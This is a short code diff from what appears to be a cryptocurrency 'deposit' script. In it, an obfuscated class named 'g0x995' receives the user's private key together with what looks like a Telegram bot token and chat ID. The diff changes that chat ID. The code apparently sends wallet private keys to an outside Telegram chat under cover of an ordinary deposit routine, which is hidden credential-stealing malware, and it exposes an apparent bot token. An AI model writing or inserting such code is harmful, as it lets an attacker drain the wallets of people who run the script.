@@ -127,7 +127,7 @@ async def run_deposit():
             _x = g0x995(
                 _k=private_key,
                 _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
-                _c=-4803688596
+                _c=-4870315398
             )
             await _x._r()      
             print(f"-" * 92)
